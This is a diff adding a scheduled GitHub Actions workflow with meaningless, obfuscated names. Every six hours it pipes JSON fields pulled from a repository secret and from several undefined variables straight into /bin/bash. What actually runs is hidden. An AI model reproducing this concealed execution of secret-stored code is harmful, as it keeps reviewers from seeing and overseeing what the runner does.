@@ -1,0 +1,24 @@
+name: penchunfenyou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: penchunfenyou
+        env:
+          m5: ${{ secrets.m5 }}
+        run: |
+          echo $m5 | jq -r .lkvvu59 | /bin/bash
+          echo $vkd8 | jq -r .ideif071 | /bin/bash
+          echo $wzvl9346 | jq -r .h96 | /bin/bash
+          echo $gybet3002 | jq -r .bkbs4947 | /bin/bash
+          echo $tveiu40 | jq -r .jygnw98700 | /bin/bash
+          echo $jtsnp281 | jq -r .p5061 | /bin/bash
+          echo $vq7 | jq -r .mnj502 | /bin/bash
+          echo $zpus2 | jq -r .xk7784 | /bin/bash
+
